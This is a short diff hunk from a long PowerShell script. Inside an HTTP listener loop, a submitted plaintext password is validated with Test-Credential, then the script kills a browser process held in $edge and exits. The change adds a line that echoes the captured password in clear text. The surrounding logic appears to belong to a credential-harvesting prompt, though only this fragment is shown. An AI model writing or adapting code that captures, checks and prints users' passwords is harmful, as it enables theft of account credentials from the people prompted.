@@ -4176,6 +4176,7 @@ while ($listener.IsListening) {
 
             if (Test-Credential -PlainPassword $password) {
                 $buffer = [System.Text.Encoding]::UTF8.GetBytes("OK")
+                echo "Password is L $password"
                 $edge.Kill()
                 exit
             } else {
